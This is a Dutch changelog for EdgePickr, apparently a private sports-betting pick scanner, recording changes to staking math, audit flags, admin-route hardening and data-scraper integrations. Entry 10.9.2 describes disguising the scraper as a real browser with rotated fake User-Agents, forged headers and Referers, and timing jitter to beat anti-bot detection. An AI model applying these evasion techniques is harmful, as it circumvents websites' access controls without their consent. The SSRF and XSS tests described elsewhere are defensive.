- **Execution-quality laag toegevoegd**. Nieuwe helper in `lib/execution-quality.js` analyseert odds-history per selectie en classificeert entry-kwaliteit (`beat_market`, `playable`, `stale_price`, `thin_market`, etc.). `GET /api/admin/v2/execution-quality` en `GET /api/admin/v2/why-this-pick` gebruiken dit nu om line-timing, stale-price risico en preferred-bookie context zichtbaar te maken.
- **Regressietests voor execution quality**. Test-suite dekt nu odds-history classificatie, stale-price detectie en het ontbreken van de target bookie.

### Changed
- **Shared odds/signal helpers weer aligned met live scanner**. `lib/picks.js` gebruikt nu dezelfde Bayesian BTTS shrinkage als `server.js`, en `bestOdds()` ondersteunt preferred-bookie filtering zodat gedeelde callers niet stil op niet-preferred prijzen terugvallen.
- **Release-discipline expliciet vastgelegd**. Productdoctrine vereist nu dat elke change meteen versie, changelog en info-page versie meeneemt.

## [10.10.0] - 2026-04-16

### Changed
- **Eén centrale versiebron toegevoegd**. Nieuwe `lib/app-meta.js` levert `APP_VERSION` aan zowel `server.js` als `lib/config.js`, en `package.json`/UI-fallbacks zijn gelijkgetrokken naar `10.10.0`. Dit voorkomt dat Render-deploys, shared libs, docs en UI nog verschillende versies tonen voor dezelfde release.
- **Repo-framing aangescherpt naar private operator-tool**. `README.md` beschrijft EdgePickr nu expliciet als single-operator betting terminal in plaats van generieke multi-user analytics app. Dat maakt de bedoelde productrichting ook voor reviewers en toekomstige refactors duidelijker.
- **Historische SaaS-denklijn gedegradeerd naar archiefstatus**. `docs/BUSINESS_PLAN.md` blijft bewaard als historisch document, maar is niet meer leidend voor huidige productkeuzes. Nieuwe actieve doctrine staat in `docs/PRIVATE_OPERATING_MODEL.md`.
- **Live pick-factory nu gedeeld met `lib/picks.js`**. `server.js` gebruikt voortaan dezelfde centrale buildPickFactory-implementatie als de gedeelde lib, met runtime-hooks voor drawdown, active unit en adaptive edge gating. Dit verwijdert drift-risico tussen “voorbereide” lib-code en de echte scanner-runtime.

### Added
- **`docs/PRIVATE_OPERATING_MODEL.md`**. Compacte productdoctrine voor scanner, learning, bankroll-discipline, point-in-time correctness en feature-gating.
- **Versie-consistentietest**. De test-suite controleert nu dat `lib/app-meta.js`, `package.json` en de front-end fallbackversies hetzelfde release-nummer voeren, zodat dit niet ongemerkt weer uit elkaar loopt.
- **Roadmap opnieuw geprioriteerd op edge**. Docs sturen nu expliciet op scanner-core, execution edge, learn-discipline, bankroll-compounding en automation; exotische marktverbreding en SaaS-achtige uitbreidingen zijn bewust gedeprioriteerd.
- **Product-roadmap verdiept naar execution- en data-laag**. Private operating model en research-doc sturen nu expliciet op historical odds, official news, confirmed starters/goalies/lineups, market microstructure, no-bet gates, compounding-engine en gescheiden single/combi learning.

## [10.9.9] - 2026-04-16

### Added
- **Scrape-source toggles persisteren in calib**. `POST /api/admin/v2/scrape-sources` schrijft sinds nu `cs.scraper_sources[name] = true/false` naar Supabase. Op boot worden enabled-flags toegepast via `setSourceEnabled`. Deploys resetten de state niet meer — eenmalig enablen blijft gelden tot expliciet uit. Adresseert LOW-finding uit external review.
- **Dynamic UNIT_EUR via admin-settings**. Pick-ranking (`expectedEur` in `buildPickFactory`) gebruikt voortaan `getActiveUnitEur()` die admin's `settings.unitEur` uitleest (fallback naar globale constant). `refreshActiveUnitEur()` draait bij scan-start en bij boot zodat compounding-updates (unit €25→€50→€100) direct doorwerken op stake-sizing én expectedEur-display zonder code-deploy. Geldt ook voor `startBankroll` (admin-setting override). Adresseert MEDIUM-finding uit external review.
- Scan-log toont `💰 Actieve unit: €X · bankroll: €Y` als admin-settings afwijken van defaults.

## [10.9.8] - 2026-04-16

### Security / single-operator hardening
Externe code review noemde expliciet: "de app moet niet aanvoelen als een platform, maar als persoonlijke trading terminal". Scope van deze release: gewone-user attack surface dichtschroeven + canonieke state strikt op admin's profiel houden.

- **`/api/prematch` admin-only**. Voorheen kon elke ingelogde user de scan triggeren → vervuilde `lastPrematchPicks` + scan_history met `user_id=null`. Nu: requireAdmin.
- **`/api/live` admin-only**. Route streamde picks met `reason` (model-IP) naar iedereen. Nu admin-only.
- **Inbox global-row mutaties alleen door admin**. PUT `/api/inbox-notifications/read` en DELETE `/api/inbox-notifications` wisten/markeerden ook `user_id=null` rows voor niet-admins — één user kon global notificaties voor iedereen wissen. Nu: non-admin raakt alleen z'n eigen rows.
- **`/api/notifications` bankroll/ROI-advies op admin's bets**. Voorheen `readBets()` zonder userId → globale aggregaat van alle user-bets. Nu scoped op admin via nieuwe `getAdminUserId()` helper (gememorized). Alle interne background-jobs (drawdown-alert, odds-drift-alert, pre-kickoff scheduler, dagelijkse resultaten-check, upgrade-check-na-scan, inbox-entries, portfolio-analyse) idem scoped.

### Niet-fixed (bewust uitgesteld)
- UNIT_EUR = 25 is nog globale constant in pick-ranking (buildPickFactory, modal-advice). Voor nu klopt het met admin's actuele unit; bij compounding-upgrade (unit €25→€50) komt dit terug in v10.10.0 als dynamic-unit-engine.
- Source-toggles blijven runtime-only (reset bij restart). Persistence naar calib in v10.9.9 gepland.

## [10.9.7] - 2026-04-16

### Added
- **💎 Combi-alternatieven paneel**. Combi's (2+3 beners) werden al berekend (`server.js:6314`) maar vielen vaak buiten top-5 door de lagere stake-cap (0.3-0.5U) vs singles (tot 2U). Nu: top-3 combis die niet in top-5 singles landen worden apart opgeslagen (`combiAlternative: true`) en gerenderd als apart paneel onder de reguliere picks. User ziet EV-max combi-optie per dag met duidelijke framing: "hogere EV per €, hogere variance — alternatief, niet extra".
- Server expose `safeCombis` array op scan-emit + persist via scan_history zodat ook restored scans het combi-paneel tonen.
- UI: nieuwe sectie met paars-accent (💎) onder top-picks, geen overlap met "See also"-secondaries (die blijven per-match).

### Beperkingen
- Alleen football combis (sport-override in `runFootball`). NBA/NHL/MLB/NFL/handball generen nog geen combis; die blijven top-5 singles only.
- Combi-stake cap (0.3-0.5U) blijft bewust laag ivm correlatie-risico tussen niet-identieke-match legs + hogere variance bij leg-failure.

## [10.9.6] - 2026-04-16

### Fixed
- **Upgrade-notify spam na elke scan**. `upgrade_api` / `upgrade_unit` notifs vuurden elke scan opnieuw — user kreeg "overweeg All-Sports" terwijl dat al gedaan was. Nu: 7-dagen rate-limit (`cs.upgrades_lastAt`) + permanent-dismiss flag (`cs.upgrades_dismissed`) in calib. Beide persisteren in Supabase zodat deploys de state niet wegvegen.
- `POST /api/admin/v2/upgrade-ack` endpoint om aanbevelingen permanent te dismissen: `{ type: 'upgrade_api', dismissed: true }`.

### Added
- **Retention-cleanup voor Supabase**. `odds_snapshots` tabel groeide onbegrensd (10k+ rows/dag), Supabase free tier is 500MB. Job draait dagelijks + delete rows >30d (drift-dashboard query't max 14d). Ook `feature_snapshots` >60d opgeruimd. Start 5min na boot om scan niet te blokkeren, daarna elke 24u.

### Security / tests
- 9 nieuwe tests: IPv6 SSRF edge cases, 172.16-172.31 private range, URL-injection met userinfo-trick + subdomain-spoof, XSS in normalizeTeamKey, unicode-input, audit signal-parser sign-requirement regressie (poisson_o25 leak die AEK-Rayo fix veroorzaakte).
- RateLimiter timing-threshold verlaagd naar 50ms (was 90ms) — jitter + system load maakte 90ms flaky.

## [10.9.5] - 2026-04-16

### Added
- **System-aanbevelingen nu óók in Supabase inbox**, niet alleen Telegram. User meldde dat "Overweeg All-Sports API upgrade" (die al gedaan was) alleen in phone-notifications verscheen en niet terug te vinden was. Inbox is het permanente logboek. Gemirrored: unit-verhoging, API-upgrade, CLV-milestone, drawdown-alert, odds-drift-alert. Telegram blijft ook bestaan — dubbele kanalen voor betrouwbaarheid.

## [10.9.4] - 2026-04-16

### Changed
- **Audit-flag werkt nu DOOR in de stake i.p.v. cosmetisch ⚠️-teken**. User meldde: "flag + 1.5U samen is inconsistent, maakt me onzeker wat te zetten". Terecht. Wanneer `suspicious=true` (gap >15pp, base-gap >15pp, signalen dekken <30%) wordt de half-Kelly nu met factor 0.6 gedamped. Effect: suspicious pick → automatisch lagere stake-tier (bv. 1.5U → 1.0U) én lagere score (9/10 → 8/10). Cijfer, stake en audit lopen nu altijd in lockstep. Flag + 2U tegelijk is onmogelijk geworden.
- **Audit-UI-regel toont nu expliciet de damping** ("· stake −40% (base-onzekerheid)") i.p.v. een rood ⚠️-icoon. Kleur van de regel is voortaan neutraal grijs; de damping staat in gele font voor zichtbaarheid zonder alarm.
- **Inbox-notificatie voor pick_audit uitgezet**: dat was redundant want stake-damping laat al zien dat het systeem voorzichtig is.

## [10.9.3] - 2026-04-16

### Fixed
- **Bug: audit signal_contrib-parser telde prob-waardes mee als adjustments**. Signals als `poisson_o25:80.0%` zijn **prob-waardes** (referentie, model gebruikt ze als input), geen adjustments. Audit-parser telde de `80.0%` als een +80pp adjustment → AEK-Rayo toonde `signalen +86pp` en `base: -12%` (nonsense). Fix: parser vereist nu expliciet `+` of `-` teken voor matches. Adjustment-signalen hebben altijd sign (`+1.5%` / `-3.0%`); prob-referenties niet (`80.0%`).

## [10.9.2] - 2026-04-16

### Changed
- **Humanized scraping**. Bot-like User-Agent ("EdgePickrBot") vervangen door echte Chrome 128 UA's (macOS/Windows/Linux + Safari) geroteerd per call. Complete browser-header set toegevoegd: `sec-ch-ua`, `sec-ch-ua-mobile`, `sec-ch-ua-platform`, `sec-fetch-dest/mode/site`, `Accept-Language`, `Accept-Encoding`, `Cache-Control`, `Connection: keep-alive`. Anti-bot detectors die op headers screenen zien nu een echte browser.
- **Rate-limiter jitter ±30%**. Vaste intervallen = kloktik-patroon dat bot-detectie triggert. Nu randomized offset per call.
- **Per-source Referer/Origin**: sofascore stuurt `Referer: https://www.sofascore.com/`, fotmob `https://www.fotmob.com/`, nba-stats `https://www.nba.com/` (+ x-nba-stats-* headers). Matcht wat echte browsers bij die API-calls sturen.

### Added
- **`GET /api/admin/v2/scrape-diagnose?name=X`** — live-test één bron en retourneert HTTP status + error reden + eerste 400 chars van response. Nieuw `returnDetails=true` mode op `safeFetch`. UI: typ `diag:sofascore` in Scrape Sources prompt → zie exact waarom een bron faalt (403 anti-bot vs 404 endpoint-change vs timeout vs json_parse_fail).
- Default timeout 5s → 7s (sommige endpoints zijn trager).

## [10.9.1] - 2026-04-16

### Fixed
- **BTTS H2H merge: replace-policy ipv additive**. v10.9.0 telde api-football H2H + aggregator H2H op, wat dubbel-telt als beide bronnen dezelfde recente ontmoetingen tonen. Nu: alleen vervangen als aggregator strikt meer samples heeft dan api-football (grotere n → minder Bayesian shrinkage). Voorkomt artificiële inflate van h2hN.

### Added
- **Circuit-breaker state-change → Supabase inbox notificatie**. Bij elke open/closed/half-open transitie schrijft scraper-hook een `scrape_source` notificatie zodat user retroactief kan zien welke bron offline ging (⚠️ "Scraper X offline") en wanneer hij herstelde (✅ "Scraper X weer online"). Event-callback registry in scraper-base.js via `onBreakerStateChange()`.

### Tests
- 304 totaal (+1 voor breaker state-change callback verificatie).

## [10.9.0] - 2026-04-16

Minor-release: externe data-aggregatie framework toegevoegd. Kelly-math en
bestaande scanners onveranderd in gedrag; scraping voegt **aanvullende** data
toe om dunne H2H-samples en stale stats op te vangen. Master-switch default
UIT — admin schakelt na productie-verificatie aan.

### Added
- **`lib/integrations/scraper-base.js`** — gedeelde primitives: `safeFetch` met SSRF-guard (blokkeert localhost/private IPs/non-https), `RateLimiter` (serialised met min-interval), `TTLCache` (LRU + TTL), `normalizeTeamKey` (diacritics + suffix-tokens strip), `CircuitBreaker` (closed/open/half-open state machine met exponential cooldown), per-source `isSourceEnabled`/`setSourceEnabled` registry.
- **`lib/integrations/sources/sofascore.js`** — SofaScore adapter (api.sofascore.com) met findTeamId + fetchH2HEvents + fetchTeamFormEvents voor football/basketball/hockey/baseball/handball/volleyball. Cache 24h, rate-limit 1200ms.
- **`lib/integrations/sources/fotmob.js`** — FotMob adapter (www.fotmob.com) voor football-form + H2H via team-fixtures kruising. Cache 12h, rate-limit 1500ms.
- **`lib/integrations/sources/nba-stats.js`** — stats.nba.com officiële endpoints met juiste headers (x-nba-stats-origin/token, Referer/Origin). Levert standings + team summary (records, streak, L10). Cache 1u.
- **`lib/integrations/sources/nhl-api.js`** — api-web.nhle.com officieel. Standings + team summary (points, GD, home/road, L10, streak). Cache 1u.
- **`lib/integrations/sources/mlb-stats-ext.js`** — statsapi.mlb.com uitbreiding. Standings met run-diff + splits + streak. Cache 1u.
- **`lib/integrations/data-aggregator.js`** — unified API `getMergedH2H` / `getMergedForm` / `getTeamSummary` per sport. Event-level dedup (date + sorted-team-pair) zodat twee bronnen die dezelfde H2H tonen niet dubbel-tellen. Fail-safe: elke source-fail → skip, aggregator faalt nooit.
- **Admin endpoints**:
  - `GET /api/admin/v2/scrape-sources` → status per source (enabled, health, breaker-state, latency)
  - `POST /api/admin/v2/scrape-sources` → toggle enable/disable óf `{action:'reset-breaker', name}` zonder redeploy
- **UI admin-panel** (v2 Operator kaart): 🌐 Scraping master toggle + 🔌 Scrape sources knop die alle source-statussen + health toont met inline reset.

### Integrated
- **Football BTTS**: `calcBTTSProb` krijgt H2H van api-football **plus** geaggregeerde events van SofaScore + FotMob. Met meer samples knijpt de v10.8.23 Bayesian shrinkage minder hard → meer vertrouwen in h2hRate waar de data het ondersteunt. Sources worden in reason getoond: `H2H: 8/12 BTTS [api-football+sofascore+fotmob]`.
- **MLB moneyline**: als api-football run-diff dun is (totalGames<10), fallback naar MLB Stats API extended (`RD/g: ... [mlb-ext]`).
- **NBA moneyline**: als api-sports home/away-split geen signaal oplevert, fallback naar stats.nba.com (`H/A: ... [nba-stats]`).
- **NHL moneyline**: als api-sports goal-diff geen signaal oplevert (dun), fallback naar api-web.nhle.com (`GD/g: ... [nhl-api]`).

### Safety
- **Default OFF**: `OPERATOR.scraping_enabled = false` en elke source individueel default off. Aanzetten via admin endpoint of UI-knop — geen code-deploy nodig.
- **Circuit breaker per source**: 5 opeenvolgende fails → open (5min cooldown, exponential tot 1u). Half-open probeert 2 successes voor close. Scraper-uitval breekt scan niet.
- **SSRF-guard**: `safeFetch` staat alleen https + allowed-hosts lijst per source toe. Blokkeert localhost, RFC1918-IP's, link-local, IPv6 loopback.
- **Rate-limiter per source**: elke bron eigen serialisatie. Timeout 5s per request.
- **Error-isolation**: aggregator-code in try/catch; scan kan niet crashen door scraper.

### Tests
- 303 unit tests totaal (45 nieuwe voor v10.9.0): SSRF-guard, TTLCache (expire/LRU), RateLimiter-serialisatie, normalizeTeamKey, CircuitBreaker state-machine, sofascore (mocked fetch: find/H2H/form, kapotte scores, disabled-state), fotmob (nested suggestions, non-finished skip, score-parsing), nba-stats (resultSets parsing, streak + records), nhl-api (nested defaults), mlb-stats-ext (records-splits parsing), aggregator (dedup-by-date+pair, summarize, merge met mocked sources).
- Async tests serialiseren nu via `runAsyncTests()` om race op global-fetch mock + module-state te voorkomen.

### Niet in deze release (komt in v10.9.x)
- FlashScore + LiveScore (headless browser nodig; aparte sessie)
- Volleybal als nieuwe sport (scanners + markten ontbreken)
- Auto-pre-fetch op scan-start (nu on-demand caching)
- Circuit-breaker metrics naar notifications-tabel (nu in-memory)

## [10.8.23] - 2026-04-16

### Fixed
- **Kritiek: H2H sample-size inflate elimineert**. `calcBTTSProb` gebruikte raw `h2hBTTS/h2hN` voor h2hRate — met 3/3 recente ontmoetingen kreeg je `h2hRate = 1.00`, waardoor base-prob tot 83% kon stijgen zonder statistische onderbouwing. Voor League Two / cup teams met kleine H2H-sample = structurele overconfidence. Nu Bayesian shrinkage: `h2hRate = (btts + prior·K) / (n + K)` met `prior=0.52` (voetbal BTTS-baseline) en `K=8`. Effect:
  - 3/3 BTTS H2H: h2hRate zakt van 1.00 → 0.65 → base ~69% ipv 83%
  - 20/25 H2H: h2hRate 0.80 → 0.73 (marginaal, terecht — grote sample = vertrouwen)
  - Resultaat: Kelly-stake schuift met de correcte prob mee. Dunne data = lagere stake automatisch, geen ad-hoc halveren meer nodig.
- H2H sample count expliciet in BTTS rationale (`H2H: 3/3 BTTS (dun)` bij n<5) zodat user meteen ziet hoe betrouwbaar de base-calc input is.
- BTTS-NEE rationale toont nu óók GF-waardes (voorheen alleen CS) zodat user de base-driver kan verifiëren.

## [10.8.22] - 2026-04-16

### Added
- **`base_prob` in audit + UI-weergave**. Audit toont nu drie lagen: `Markt: X% · base: Y% · signalen: ±Zpp → model: W%`. `base_prob` = model output vóór signal-adjustments (= `prob − relevante signalen`), dus feitelijk de `calcBTTSProb` / `fpHome` / base Poisson output. Lost hoofdpijn op: user zag "signalen -6.8pp" bij Bromley en dacht "hoe kan model dan 2U/10/10 zijn" — nu zichtbaar dat base ~82.8% is (H2H + GF gedreven) en signalen die tempert naar 76%.
- **Slimmere ⚠️-flag**: triggered nu alleen als `gap>15pp` én base-divergentie van markt is ook groot én signalen dekken <30% van die base-afwijking. Betekent: de **kern** van de model-claim zit ver van markt zonder signaal-ondersteuning — dán extra checken. Reduceert false positives van de vorige "signalen < 50% gap" heuristiek.
- **Inbox-notificatie body** toont nu zowel `base` als `final` prob + signalen zodat user in de notif direct ziet waar de claim vandaan komt.

## [10.8.21] - 2026-04-16

### Fixed
- **Audit signal_contrib filtert nu per-markt**. Voorheen werden alle matchSignals gesommeerd ongeacht pick-type, wat inflate gaf: Bromley BTTS JA toonde "signalen +31.4pp" terwijl ML-signalen (form, position, run_diff, pitcher) bttsYesP niet beïnvloeden. Nu per-market filter:
  - **BTTS picks** → alleen `btts_*` + `aggregate_push_btts`
  - **Over/Under picks** → weather, poisson, team_stats, over/under keywords
  - **Moneyline picks** → alles behalve BTTS/Over-specifieke signalen
  
  Effect: gaps die eerst door valse signaal-som "gedekt" leken worden nu eerlijk geflagd. Bromley zou met geschatte BTTS-signalen ~7pp tegen gap +22.5pp onder de 50%-dekking vallen en ⚠️ krijgen. Honest.

## [10.8.20] - 2026-04-16

### Fixed
- **Rollback v10.8.19: Kelly-math weer primair**. kellyToUnits 2.0U-drempel terug naar `hk > 0.10` zodat half-Kelly sizing EV-optimaal blijft. v10.8.19 had dit verhoogd naar 0.11 voor display-consistentie, maar dat offert kleine EV op (picks met hk 0.10-0.11 kregen 1.5U i.p.v. 2.0U).
- **Score-tier nu 1-1 gekoppeld aan stake-tier** i.p.v. lineaire formule. 0.3U=5 · 0.5U=6 · 0.75U=7 · 1.0U=8 · 1.5U=9 · 2.0U=10. Voorheen gaf (hk-0.015)/0.135*5+5 bv. hk=0.105 → score 8 + 2.0U (inconsistent). Nu krijgt elke 2.0U pick automatisch score 10/10. Geen EV-impact want stake-thresholds zijn niet veranderd — alleen de score-display volgt voortaan de stake-tier.
- `kellyScore()` nieuwe export uit lib/model-math.js; server.js `safePicks`, lib/modal-advice.js `scoreFromHk` en index.html `renderPicks` gebruiken allen dezelfde tier-mapping. Tests ge-refactored naar nieuwe 6-tier assertions + lockstep-check tussen kellyToUnits en kellyScore.

## [10.8.19] - 2026-04-16

### Fixed
- **Score 8/10 kon 2.0U stake krijgen** (mismatch stake-tier vs score-tier). `kellyToUnits` had 2.0U-drempel bij `hk > 0.10`, maar score 9 begint pas bij `hk ≥ 0.1095`. Dus hk=0.105 → score 8 + 2.0U. Counterintuïtief en niet aligned met de doc-belofte "score 9+ → 2.0U". Drempel verhoogd naar `hk > 0.11` zodat 2.0U altijd vraagt om score 9+. Tests aangepast: 0.10 en 0.11 → 1.5U (was 2.0U bij 0.11).
- **Audit-regel ontbrak in live scan-stream**. `safePicks` in runFullScan stripte `p.audit` omdat hij specifieke velden kopieerde. Live emit leverde daardoor picks zonder audit-data — pas na refresh (history-pad) werd audit zichtbaar. Fix: `audit: p.audit || null` meegenomen in safePicks object. `PUBLIC_PICK_FIELDS` uitgebreid met `'audit'` zodat ook non-admin users audit zouden kunnen zien.

## [10.8.18] - 2026-04-16

### Fixed
- **Humanized narrative verdween bij middelmatige stats**. `humanizePickReason` had alleen extremen-drempels (BTTS-JA: GF ≥1.7 of ≤1.0, BTTS-NEE: CS ≥35%). Picks in het midden (bv. Bromley BTTS JA met GF 1.58/1.48 of Peterborough BTTS NEE met CS 22%/30%) kregen geen enkele fact → leeg narrative-blok. Nu: elke BTTS pick krijgt een eerlijke beschrijving, ook bij middenwaardes (*"beide teams scoren regelmatig (1.58+1.48 goals/match)"*, *"matige clean-sheet rate (22%/30%) — defensie-signaal aanwezig"*).
- **Ultimate fallback-narrative**: als zelfs na alle checks geen opening + facts verzameld → gebruik pick.prob vs markt-implied (1/odd) om minimaal een "Model ziet meer/minder kans dan markt" regel te tonen. Elke pick toont voortaan minstens iets.

## [10.8.17] - 2026-04-16

### Added
- **Per-pick audit — markt-baseline + signal-coverage op elke pick**. Elke pick krijgt `audit: { baseline_prob, signal_contrib, prob_gap }`. Baseline = markt-implied uit odds (100/odd). signal_contrib = som van alle "+X%" / "-X%" strings uit signals-array. prob_gap = model − baseline. UI toont onder elke pick-analyse de regel: `Markt: X% · signalen: +Ypp → model: Z% (gap ±Npp)`. Kleuren: grijs <10pp, geel 10-15pp, rood >15pp. ⚠️-icon bij onverklaarbare gap (>15pp & signal_contrib < 50% van gap).
- **Inbox-notificatie bij flagged picks**. Na scan wordt per gevlagde pick een `pick_audit` notificatie naar Supabase geschreven (geen Telegram): "⚠️ N pick(s) met onverklaarbare prob-sprong" + lijst van matches + gaps. Doel: vroege detectie van model-drift of over-confidence voor een specifieke markt/sport.
- Audit wordt gepersisteerd in scan_history zodat we over tijd kunnen analyseren of flagged picks systematisch slechter presteren dan niet-flagged.

## [10.8.16] - 2026-04-16

### Fixed
- **Kritiek: double-counting van home-advantage over ALLE sports**. Probability `adjHome = fpHome + ha + ...` maar `fpHome` komt uit de-vigged bookmaker consensus (`(1/avgHomePrice)/totalIP`) die home-advantage al bevat. Extra `ha` optellen (4-6% per sport/liga) gaf systematische +3-6pp bias richting home teams. Voorbeeld: MLB Reds ML had consensus 53.4% → model 61% (edge 5.7%). Zonder de ha-dubbeltelling zakt prob naar ~57%, edge onder MIN_EDGE → pick haalt de scan niet. Fix: `ha = 0` in de `adjHome`/`adjAway` formules voor football, MLB, NBA, NHL, NFL, handball. `league.ha` configs blijven voor toekomstig gebruik (bv. sport-specifieke residual HA als data dat ondersteunt).
- **MAX_PICKS-cap kwam niet door naar UI bij scan-restore**. `saveScanEntry` persisteerde de `selected` flag niet naar scan_history — plus `renderPicks` in index.html filterde niet op selected. Live scan emit stuurt wel alleen top-N (5), maar zodra je naar een andere tab ging en terugkwam laadde UI álle kandidaten uit history (bv. 8 picks zichtbaar terwijl MAX_PICKS=5 + MAX_PER_SPORT=2). Nu: `saveScanEntry` schrijft `selected: p.selected !== false` mee, `renderPicks` filtert `p.selected !== false` (pre-v10.8.16 entries zonder flag blijven zichtbaar via undefined-check).
- **BTTS narrative zei "hoge clean-sheet rate" bij matige CS (22%/30%)**. `humanizePickReason` in index.html voegde altijd "hoge clean-sheet rate — BTTS-Nee onderbouwd" toe zodra `CS:` in de reason-string stond, ongeacht waarde. Gaf misleidende uitleg bij picks waar CS eigenlijk niet de driver was. Nu: alleen tonen als minstens één team CS ≥ 35%, met het daadwerkelijke percentage.

### Added
- **Dynamische MAX_PER_SPORT cap op basis van bewezen ROI**. Default 2 picks per sport, 3 als een sport ≥100 settled bets én ROI ≥ 5% heeft (bewezen terrein), 1 in panic_mode. Cache-refresh elke 10 min via `refreshSportCaps()` — geen extra DB-hit per scan. Scan-log toont welke sporten op cap=3 staan: `🏆 Bewezen sporten (cap=3): baseball(n=120, ROI +6.4%)`. Voorheen hard-coded op 2 voor alle sports, ongeacht historische prestaties.

### Changed
- Diversification-stap in runFullScan gebruikt nu `getSportCap(sport)` per pick i.p.v. één constante. Log-tekst bij geskipte picks: "per-sport cap bereikt (default 2, bewezen sport 3)".

## [10.8.15] - 2026-04-15

### Fixed
- **Notificatie-badge "1" bleef hangen ondanks dat model-log gezien was**: `modelLogSeen` werd alleen geset vanuit `loadNotifications()` — openen van Info/Model-tab (`loadModelLog()`) updatete de seen-ts niet. Nu wordt de seen-ts geset op de meest recente model-update zodra `loadModelLog()` de items rendert, gevolgd door een directe `loadNotifications()` refresh.
- **Analyzer respecteerde `preferredBookies` niet**: `/api/analyze` haalde picks uit `lastPrematchPicks` + scan history zonder user-bookie filter. Je kreeg dus een pick terug op William Hill terwijl je alleen Bet365/Unibet had. Nu filtert de endpoint eerst op user's bookies; als er alleen picks bestaan buiten je set geeft hij een expliciete waarschuwing + de pick-lijst aan welke bookies ze wel hadden.

### Added
- **Pure edge naast damped edge op pick card**: bij signaal-damping (bv. baseball moneyline ×0.28) leek "59% kans + 1.88 odds → edge +6.2%" raar, want pure EV-edge zou +11.9% zijn. Card toont nu "Edge +6,2% (pure 11,9%)" met tooltip die de damping uitlegt. Modal deed dit al (v10.8.11), card trok gelijk.
- **Experimental signals tonen aantal gelogde bets + WR%**: naast ACTIEF/LOGGED-ONLY-badge zie je "N bets · WR X%" per signal, gekleurd op sample size (grijs <10 · geel 10-50 · groen ≥50). Data komt uit `/api/signal-analysis` (settled bets met signal-tracking).
- **Odds drift scope toggle**: "Mijn bets" (default) filtert naar fixtures waar je zelf op hebt gelogd — voorheen toonde de view ook baseball games die je nooit aanraakte. "Alle fixtures" knop blijft beschikbaar voor brede data (meer samples per bucket). Endpoint accepteert `?scope=mine|all`.
- **Cron heartbeat + scheduler-status**: elke cron-tik schrijft nu een `cron_tick` notificatie naar Supabase zodat je achteraf kan zien of de scheduler überhaupt vuurde. Nieuwe endpoint `/api/admin/scheduler-status` toont admin's geconfigureerde scan-tijden + volgende fire-time per slot + aantal actieve timers. Bedoeld om te onderscheiden tussen "scheduler stilstand" en "scan draaide maar tg()/push faalde" — relevant voor ontbrekende 21:00 notificaties.

### Changed
- Startup logt nu admin's scan-tijden + `scanEnabled` state zodat je in Render logs direct ziet welke tijden gepland staan.

## [10.8.14] - 2026-04-15

### Added
- **Odds drift dashboard** — nieuwe Data-tab kaart "📉 Odds drift" toont per sport + markt + uur-vóór-kickoff bucket (0-2h / 2-6h / 6-12h / 12-24h / 24-48h / 48h+) de gemiddelde prijs-beweging t.o.v. de closing line. Groen = odds waren vroeger hoger (vroege entry beter), rood = later inzetten gaf betere prijs. Kolom "Beste entry" flaggt de optimale bucket per markt. Endpoint `/api/admin/odds-drift?days=14` met min samplegrootte 5 per bucket.

## [10.8.13] - 2026-04-15

### Fixed
- **Scheduled scans sturen nu ook notificaties**: voorheen deed `scheduleScanAtHour` alleen `runPrematch()` (football, geen Telegram/push). Verklaart waarom je geen 14:00 notificatie kreeg.
- **Scheduled scans doen nu de volle multi-sport pipeline**: basketball + hockey + baseball + NFL + handball werden overgeslagen door cron — alleen UI-triggers deden alle 6 sporten.

### Changed
- **Refactor: `runFullScan()` shared function**. Pipeline geëxtraheerd uit `app.post('/api/prematch')` route zodat handmatige én cron scans identiek draaien — multi-sport, kill-switch, diversification, pick-selectie, tg() notificatie, scan-history save. Route is nu dunne SSE wrapper.
- Cron-scan gebruikt admin's `preferredBookies` setting voor consistente bookie-filter met UI.

## [10.8.12] - 2026-04-15

### Fixed
- **"See also" secondaries verdwenen na re-render**: in `renderPicks()` werd `el._picks = dedupedPicks` gezet (alleen primaries). Bij re-render (via `loadBets()` voor Gelogd-chip fix) gingen secondary BTTS/O2.5 picks verloren. Nu `el._picks = picks` (origineel, incl secondaries) — renderPicks dedupt opnieuw.
- **Auto-refresh pakte nog steeds geen nieuwe scans op**: cache-bust query param (`?_=<ts>`) op `/api/scan-history` fetch + server stuurt nu `Cache-Control: no-store`. Dekt browser + eventuele CDN edge-cache.

## [10.8.11] - 2026-04-15

### Fixed
- **Modal edge matcht nu card edge bij ongewijzigde odds**: v10.8.10's damping via `origUnits / pureRec_bucket` gaf 0.5 waar werkelijke scanner-damping ~0.38 was (Luton: card 7% vs modal 9.2%). Nu gebruikt modal de **stored `modalPick.edge`** als authoritative anker en schaalt proportioneel bij odds-verandering: `dampedEdge_new = origEdge × (pureEdge_new / pureEdge_orig)`. Luton:
  - 1.91 unchanged → modal toont 7% (= card)
  - 1.86 → 5.8% (7 × 15.3/18.4)
  - 1.80 → 4.4% (onder MIN_EDGE — adverse blijft gelden)
  Fallback naar bucket-inversie als `modalPick.edge` niet aanwezig is (oudere picks).

### Tests
3 nieuwe tests voor origEdge-based damping + fallback. Totaal **254 tests, 0 failed** (was 251).

## [10.8.10] - 2026-04-15

### Fixed
- **Modal toont nu gedempte edge (scanner-proxy)**: voorheen toonde modal pure Kelly-edge (bv 18.4% bij Luton 1.91) terwijl de pick-card gedempte edge van 7% toonde. Dat was inconsistent — "als 18.4% echt was, had scanner hem hoger gerankt". Nu: `dampedEdge = edge × (origUnits/pureRec_at_origOdds)`. Luton 1.91 → 9.2% effectief, bij 1.80 → 5.8% effectief (bijna onder MIN_EDGE). Bij significante damping (<0.95) toont modal ook de pure edge erachter in muted tekst.
- **Payout-boxen bleven leeg na advice-update**: stake/uitbetaling/winst werden berekend aan begin van `updatePayout()` terwijl units pas NA de advice-compute werden bijgesteld → boxen toonden €—. Nu `writePayout(advice.recUnits)` na elke advies-return.
- **Auto-refresh pakte nieuwe scan niet altijd op**: interval van 5min was te lang bij actieve sessies, en baseline-init via 2s timeout kon misgaan. Nu 90s interval, extra `window.focus` listener, en microtask-gebaseerde baseline die direct klaar is zodra `scanHistory` gevuld is.

### Changed
- **Adverse threshold verlaagd van -6% naar -5%**: 5.8% line-move (Luton/Padres) was eerder nog "moderate" (0.3U gehalveerd). Voelde te lief — gebruiker wil 1.91→1.80 als ongeldige pick flaggen. Nu:
  - Licht: -2 tot -3.5% (1 bucket lager)
  - Matig: -3.5 tot -5% (gehalveerd)
  - **Adverse: >-5% (0U, pick niet valide)**

### Tests
2 nieuwe tests voor dampedEdge + threshold update bestaande tests. Totaal **251 tests, 0 failed** (was 249).

## [10.8.9] - 2026-04-15

### Fixed
